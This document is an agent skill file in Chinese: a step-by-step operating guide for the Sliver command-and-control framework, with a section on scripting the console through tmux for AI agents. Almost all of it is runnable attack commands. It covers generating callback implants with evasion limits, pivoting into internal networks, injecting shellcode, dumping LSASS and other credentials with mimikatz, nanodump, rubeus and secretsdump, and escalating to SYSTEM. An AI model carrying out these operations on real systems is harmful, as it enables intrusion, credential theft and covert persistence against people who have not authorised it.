---
name: sliver-c2
description: "Sliver C2 框架操作指南。当需要建立命令与控制通道、管理植入体、进行后渗透操作时使用。支持 mTLS/HTTPS/DNS/WireGuard 多协议、Session/Beacon 双模式、SOCKS5 代理、TCP/Named Pipe 多层穿透。适用于红队行动和渗透测试场景。"
metadata:
  tags: "sliver,c2,command-and-control,implant,beacon,session,mtls,socks5,pivoting,named-pipe,post-exploitation,bof"
  category: "evasion"
---

# Sliver C2 框架操作指南

Sliver 是开源跨平台 C2 框架，支持多协议通信 (mTLS/HTTPS/HTTP/DNS/WireGuard)、Session/Beacon 双模式、端口转发/SOCKS5/TCP Pivot/Named Pipe Pivot 穿透能力、Armory 扩展生态与 BOF/COFF 执行。

---

## Phase 1: 环境准备

```bash
# 安装
curl https://sliver.sh/install | sudo bash
sliver-server       # 启动服务端
sliver-client       # 客户端连接
```

### tmux 非交互式操作 (AI Agent 场景)

```bash
tmux new-session -d -s sliver "/path/to/sliver-client console"
sleep 5
tmux send-keys -t sliver "version" Enter
sleep 2
tmux capture-pane -t sliver -p | tail -20           # 捕获输出
tmux send-keys -t sliver "generate --mtls 10.0.0.164:8888 --os linux --save /tmp/implant" Enter
sleep 120                                             # 等待编译
tmux capture-pane -t sliver -p                        # 查看结果
tmux kill-session -t sliver                           # 关闭
```

### 基本命令

```bash
sliver > version          # 版本
sliver > jobs             # 运行中的监听器
sliver > implants         # 已生成的 implant
sliver > sessions         # 活跃会话
sliver > beacons          # 活跃 beacon
```

---

## Phase 2: Listener 配置

```bash
sliver > mtls                                          # mTLS (推荐)
sliver > mtls --lhost 192.168.1.100 --lport 8888
sliver > https --domain example.com                    # HTTPS
sliver > https --domain example.com --lets-encrypt     # HTTPS + 自动证书
sliver > https --domain example.com --website fake-blog # HTTPS + 静态伪装
sliver > http                                          # HTTP
sliver > dns --domains 1.example.com.                  # DNS (FQDN 末尾带点)
sliver > wg                                            # WireGuard
sliver > jobs                                          # 查看监听器
sliver > jobs -k JOB_ID                                # 停止监听器
```

### 协议对比

```
+------------+--------+----------------+------+--------+------------------+
| 协议       | 默认端口 | 加密方式       | 速度 | 隐蔽性 | 推荐场景         |
+------------+--------+----------------+------+--------+------------------+
| mTLS       | 8888   | TLS 双向认证   | 快   | 中     | 内网/可控环境     |
| HTTPS      | 443    | TLS            | 中   | 高     | 出网受限环境      |
| HTTP       | 80     | 应用层加密     | 中   | 中     | 代理环境          |
| DNS        | 53     | 应用层加密     | 慢   | 高     | 高度受限网络      |
| WireGuard  | 53/UDP | WireGuard      | 快   | 中     | 需要端口转发      |
+------------+--------+----------------+------+--------+------------------+
```

-> [references/c2-protocols.md](references/c2-protocols.md)

---

## Phase 3: Implant 生成

### Session vs Beacon

| 特性 | Session | Beacon |
|------|---------|--------|
| 通信 | 实时持久连接 | 定期轮询 (默认 60s) |
| 隐蔽性 | 较低 | 较高 |
| shell/portfwd/pivot | 直接支持 | 需 `interactive` 切换 |
| 适用 | 交互操作 | 长期潜伏 |

### 生成命令

```bash
# Session 模式
sliver > generate --mtls example.com --os windows --arch amd64 --save /tmp
# Beacon 模式
sliver > generate beacon --mtls example.com --os windows --seconds 30 --jitter 10 --save /tmp
# 多协议备份
sliver > generate --mtls example.com --http backup.com --dns 1.dns.com.
# 输出格式: exe / shared (DLL/SO) / shellcode / service (Windows 服务)
sliver > generate --mtls example.com --format shellcode --save /tmp
```

### 规避选项

```bash
sliver > generate --mtls example.com --limit-datetime "2024-12-31"    # 限制执行时间
sliver > generate --mtls example.com --limit-domainjoined             # 仅域加入机器
sliver > generate --mtls example.com --limit-hostname "TARGET-PC"     # 限制主机名
sliver > generate --mtls example.com --limit-username "admin"         # 限制用户名
```

-> [references/implant-generation.md](references/implant-generation.md)

---

## Phase 4: Session 管理

### 交互

```bash
sliver > use SESSION_ID                 # 使用会话
sliver (BEACON) > interactive           # Beacon 切换到 Session
sliver (SESSION) > close                # 关闭会话
```

### 文件操作

```bash
sliver (SESSION) > ls / cd / pwd / cat             # 文件系统导航
sliver (SESSION) > download /remote/file /local     # 下载
sliver (SESSION) > upload /local/file /remote       # 上传
sliver (SESSION) > mkdir /path && rm /path          # 创建/删除
```

### 进程管理

```bash
sliver (SESSION) > ps                               # 列出进程
sliver (SESSION) > ps -e "lsass"                    # 按名称过滤
sliver (SESSION) > kill PID                          # 终止进程
sliver (SESSION) > procdump -p PID -s /tmp/proc.dmp # 进程转储
```

### 命令执行

```bash
sliver (SESSION) > shell                             # 交互式 shell (仅 Session)
sliver (SESSION) > execute -o whoami                 # 执行并返回输出
sliver (SESSION) > execute -o "cmd /c dir"
sliver (SESSION) > msf -m payload/windows/x64/exec   # Metasploit 集成
```

---

## Phase 5: 网络穿透

### 端口转发

```bash
sliver (SESSION) > portfwd add --remote 10.10.10.10:3389               # 本地转发
sliver (SESSION) > portfwd add --bind 0.0.0.0:1234 --remote 10.10.10.10:22
sliver (SESSION) > rportfwd add --remote 0.0.0.0:8080 --local 127.0.0.1:80  # 反向转发
sliver (SESSION) > wg-portfwd add --remote 10.10.10.10:3389            # WireGuard 转发
sliver (SESSION) > portfwd rm ID                                        # 删除
```

### SOCKS5 代理 + proxychains4

```bash
sliver (SESSION) > socks5 start --port 1080
sudo sed -i 's/^socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
proxychains4 -q nmap -sT -Pn -p 445,389,88 192.168.56.0/24
proxychains4 -q netexec smb 192.168.56.0/24
proxychains4 -q secretsdump.py domain/user:pass@192.168.56.10
```

### TCP Pivot (多层内网)

```bash
sliver (EDGE_SESSION) > pivots tcp --bind 0.0.0.0:9898       # 边界机器启动 pivot
sliver > generate --tcp-pivot 10.10.10.5:9898 --save /tmp    # 生成 pivot implant
sliver (EDGE_SESSION) > upload /tmp/IMPLANT C:\Windows\Temp\  # 上传执行
sliver (EDGE_SESSION) > execute C:\Windows\Temp\IMPLANT
```

### Named Pipe Pivot (同网段隐蔽)

```bash
sliver (SESSION) > pivots named-pipe --bind mypipe --allow-all
sliver > generate --named-pipe 192.168.1.100/pipe/mypipe --save /tmp
```

-> [references/pivoting-proxy.md](references/pivoting-proxy.md)

---

## Phase 6: 后渗透

### 进程注入

```bash
sliver (SESSION) > migrate PID                                    # 迁移进程
sliver (SESSION) > execute-shellcode -p PID /path/to/shellcode.bin # Shellcode 注入
sliver (SESSION) > execute-assembly /path/to/assembly.exe arg1     # .NET 内存加载
```

### 凭据操作

```bash
sliver > armory install nanodump
sliver (SESSION) > nanodump                                        # LSASS 转储
sliver > armory install rubeus
sliver (SESSION) > rubeus triage / kerberoast / asreproast         # Kerberos 操作
sliver > armory install mimikatz
sliver (SESSION) > mimikatz "sekurlsa::logonpasswords"             # 凭据提取
```

### 权限提升

```bash
sliver (SESSION) > getsystem                     # 获取 SYSTEM
sliver (SESSION) > impersonate USERNAME           # 模拟用户
sliver (SESSION) > rev2self                       # 恢复原始 token
```

### Armory 扩展与 BOF 执行

```bash
sliver > armory                                   # 列出可用扩展
sliver > armory install coff-loader               # BOF 加载器
sliver > armory install rubeus nanodump seatbelt sharphound sharpwmi
sliver > armory install all                       # 安装所有
sliver > extensions                               # 查看已安装
sliver (SESSION) > nanodump -h                    # BOF 帮助
sliver (SESSION) > rubeus kerberoast              # 直接调用 BOF
```

-> [references/post-exploitation.md](references/post-exploitation.md)

---

## 决策树

```
需要建立 C2 通道?
|
+-- 网络环境评估
|   |
|   +-- 内网/可控环境 ---------> mTLS (最快最稳)
|   +-- 出网受限/有代理 -------> HTTPS (代理感知)
|   +-- 仅 DNS 出网 -----------> DNS (慢但隐蔽)
|   +-- 需要高效隧道 ----------> WireGuard
|   +-- 不确定 ----------------> 多协议备份 (mTLS + HTTPS + DNS)
|
+-- 选择 Implant 模式
|   |
|   +-- 需要实时交互? ---------> Session (shell/portfwd/socks5)
|   +-- 需要长期潜伏? ---------> Beacon (--seconds/--jitter)
|
+-- 需要访问内网资源?
|   |
|   +-- 单个端口 --------------> portfwd add
|   +-- 多个端口/扫描 ---------> socks5 start + proxychains4
|   +-- 目标无法出网 ----------> TCP Pivot
|   +-- 同网段横向 (Windows) --> Named Pipe Pivot
|
+-- 后渗透操作
    |
    +-- 需要凭据 --------------> nanodump / rubeus / mimikatz BOF
    +-- 需要持久化 ------------> migrate 到稳定进程
    +-- 需要执行 .NET 工具 ----> execute-assembly
    +-- 需要 BOF 扩展 ---------> armory install + 直接调用
```

---

## 工具清单

| 工具 | 用途 |
|------|------|
| sliver-server | C2 服务端 |
| sliver-client | 操作员客户端 |
| wg-quick | WireGuard 客户端 |
| tmux | 非交互式脚本集成 |
| proxychains4 | SOCKS 代理工具链路由 |

---

## 参考文档

- -> [references/c2-protocols.md](references/c2-protocols.md) - C2 协议配置详解
- -> [references/implant-generation.md](references/implant-generation.md) - Implant 生成详解
- -> [references/pivoting-proxy.md](references/pivoting-proxy.md) - 网络穿透与代理
- -> [references/post-exploitation.md](references/post-exploitation.md) - 后渗透操作
